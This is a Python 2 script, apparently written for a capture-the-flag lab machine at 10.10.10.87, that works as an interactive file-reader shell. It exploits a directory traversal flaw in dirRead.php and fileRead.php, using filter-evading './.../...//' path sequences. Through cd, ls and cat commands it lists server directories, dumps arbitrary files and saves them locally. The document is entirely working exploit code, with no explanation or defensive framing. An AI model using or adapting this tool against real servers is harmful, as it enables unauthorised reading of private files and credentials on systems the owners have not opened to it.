import requests as rq
import sys, os

url = "http://10.10.10.87/"
headers={'Content-Type':'application/x-www-form-urlencoded'}
startdir = "./.../...//.../...//.../...//"
currentdir = startdir
print("#########"*4+"\n# Directory traversal file reader. #\n#  Commands: cd, ls, cat & clear.  #\n"+"#########"*4)

while True:
	location = currentdir[len(startdir)-1:]
	userinp = raw_input(location+" > ").split(" ")

	#cd command
	if userinp[0] == "cd":
		if len(userinp) == 1:
			currentdir = startdir
			continue
		if userinp[1].startswith(".."):
			if currentdir != startdir:
				currentdir = ('/'.join(currentdir.split("/")[:-2]))+"/"
			continue
		if userinp[1].endswith("/") == False:
			userinp[1] += "/"
		if userinp[1].startswith("/"):
			_currentdir = startdir + userinp[1][1:]
			data = "path="+_currentdir
			resp = rq.post(url+"dirRead.php", data=data, headers=headers).json()
			if str(resp) == "False":
				print("Directory name invalid.")
			else:
				currentdir = _currentdir
			continue
		data = "path="+currentdir
		resp = rq.post(url+"dirRead.php", data=data, headers=headers).json()
		if ((any(x == userinp[1].replace("/","") for x in resp)) == False):
			print("Directory name invalid.")
			continue
		currentdir += userinp[1]

	#ls command
	if userinp[0] == "ls":
		if len(userinp) == 2:
			data = "path="+currentdir+userinp[1]
			resp = rq.post(url+"dirRead.php", data=data, headers=headers).json()
			for i in resp: print i
		else:
			data = "path="+currentdir
			resp = rq.post(url+"dirRead.php", data=data, headers=headers).json()
			try:
				for i in resp: print i
			except:
				print("Insufficient permissions.")

	#cat command
	if userinp[0] == "cat":
		catdir = currentdir
		if userinp[1].startswith("/"):
			catdir = startdir+'/'.join(userinp[1].split("/")[:-1])+"/"
			userinp[1] = str((userinp[1].split("/"))[-1])
		data = "path="+catdir
		resp = rq.post(url+"dirRead.php", data=data, headers=headers).json()
		if ((any(x == userinp[1].replace("/","") for x in resp)) == False):
			print("No file named %s." % str(userinp[1]))
			continue
		data = "file="+catdir+userinp[1]
		resp = rq.post(url+"fileRead.php", data=data, headers=headers).json()['file']
		if str(resp).lower() == "False":
			print("Insufficient permissions.")
			continue
		print(resp)
		try: userinp[2]
		except: continue
		if userinp[2] == ">":
			outfile = userinp[3]
			with open(outfile, 'w') as f:
				f.write(resp)
			print("Output saved to %s" % outfile)

	#clear command
	if userinp[0] == "clear":
		os.system("clear")

	#exit command
	if userinp[0] == "exit":
		sys.exit()
